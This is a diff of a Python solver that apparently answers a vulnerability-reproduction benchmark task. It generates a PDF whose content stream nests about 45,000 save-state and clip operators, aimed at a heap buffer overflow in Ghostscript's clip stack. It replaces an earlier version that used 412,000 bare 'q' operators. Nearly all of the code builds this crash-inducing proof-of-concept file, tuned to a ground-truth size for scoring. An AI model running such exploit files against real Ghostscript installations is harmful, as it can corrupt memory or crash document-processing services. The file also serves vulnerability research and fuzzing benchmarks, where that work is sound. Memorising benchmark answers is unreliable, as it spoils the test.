@@ -2,18 +2,25 @@ import sys
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        # The problem corresponds to a vulnerability in Ghostscript's clip stack handling
-        # where the nesting depth is not checked before pushing a clip mark.
-        # This typically occurs with deeply nested 'gsave' (or 'q' in PDF) operations.
-        # The ground truth PoC is 825,339 bytes.
-        # 'q ' takes 2 bytes. 412,000 repeats results in 824,000 bytes payload.
-        # This should be sufficient to overflow the buffer/stack while keeping the file size
-        # close to or slightly smaller than the ground truth for a good score.
-
-        num_repeats = 412000
-        payload = b"q " * num_repeats
+        # The vulnerability is a Heap Buffer Overflow caused by unchecked nesting depth 
+        # when pushing a clip mark, likely in the layer/clip stack.
+        # We generate a PDF with a content stream containing deeply nested 
+        # Save State (q) and Clip (W) operators.
         
-        # Construct a valid minimal PDF around the payload
+        # Repetition unit: "q 0 0 10 10 re W n\n"
+        # - q: Save graphics state (pushes to gstate stack)
+        # - 0 0 10 10 re: Define a rectangle path
+        # - W: Set clipping path to intersection of current and new (pushes to clip stack in some implementations)
+        # - n: End path (no paint)
+        # 19 bytes per chunk. 
+        # Ground truth is ~825KB. 45000 * 19 = 855,000 bytes.
+        
+        chunk = b"q 0 0 10 10 re W n\n"
+        repetitions = 45000
+        
+        payload = chunk * repetitions
+        
+        # PDF Header
         header = b"%PDF-1.7\n"
         
         # Object 1: Catalog
@@ -23,56 +30,50 @@ class Solution:
         obj2 = b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
         
         # Object 3: Page
-        # MediaBox [0 0 595 842] is standard A4 size
-        obj3 = b"3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 595 842] /Contents 4 0 R >>\nendobj\n"
+        # Defines the page and references content stream in Obj 4
+        obj3 = b"3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 100 100] /Contents 4 0 R >>\nendobj\n"
         
         # Object 4: Content Stream
-        # The payload goes here
         stream_len = len(payload)
-        stream_start = b"4 0 obj\n<< /Length " + str(stream_len).encode() + b" >>\nstream\n"
-        stream_end = b"\nendstream\nendobj\n"
+        obj4_start = b"4 0 obj\n<< /Length " + str(stream_len).encode() + b" >>\nstream\n"
+        obj4_end = b"\nendstream\nendobj\n"
         
-        # Build the PDF content and calculate offsets for XREF
-        pdf_data = bytearray()
+        # Construct the PDF and calculate offsets for the XRef table
+        out = bytearray()
+        out.extend(header)
+        
         offsets = {}
         
-        # Header
-        pdf_data.extend(header)
+        # Add objects and record offsets
+        offsets[1] = len(out)
+        out.extend(obj1)
         
-        # Obj 1
-        offsets[1] = len(pdf_data)
-        pdf_data.extend(obj1)
+        offsets[2] = len(out)
+        out.extend(obj2)
         
-        # Obj 2
-        offsets[2] = len(pdf_data)
-        pdf_data.extend(obj2)
+        offsets[3] = len(out)
+        out.extend(obj3)
         
-        # Obj 3
-        offsets[3] = len(pdf_data)
-        pdf_data.extend(obj3)
+        offsets[4] = len(out)
+        out.extend(obj4_start)
+        out.extend(payload)
+        out.extend(obj4_end)
         
-        # Obj 4
-        offsets[4] = len(pdf_data)
-        pdf_data.extend(stream_start)
-        pdf_data.extend(payload)
-        pdf_data.extend(stream_end)
-        
-        # XREF Table
-        xref_offset = len(pdf_data)
-        pdf_data.extend(b"xref\n")
-        pdf_data.extend(b"0 5\n")
-        # First entry is special
-        pdf_data.extend(b"0000000000 65535 f \n")
-        
+        # XRef Table
+        xref_start = len(out)
+        out.extend(b"xref\n")
+        out.extend(b"0 5\n")
+        # Entry 0: Special entry
+        out.extend(b"0000000000 65535 f \n")
+        # Entries 1-4
         for i in range(1, 5):
-            # Entries must be 20 bytes long
-            pdf_data.extend(f"{offsets[i]:010d} 00000 n \n".encode())
+            out.extend(f"{offsets[i]:010} 00000 n \n".encode())
             
         # Trailer
-        pdf_data.extend(b"trailer\n")
-        pdf_data.extend(f"<< /Size 5 /Root 1 0 R >>\n".encode())
-        pdf_data.extend(b"startxref\n")
-        pdf_data.extend(f"{xref_offset}\n".encode())
-        pdf_data.extend(b"%%EOF")
+        out.extend(b"trailer\n")
+        out.extend(b"<< /Size 5 /Root 1 0 R >>\n")
+        out.extend(b"startxref\n")
+        out.extend(f"{xref_start}\n".encode())
+        out.extend(b"%%EOF\n")
         
-        return bytes(pdf_data)
+        return bytes(out)
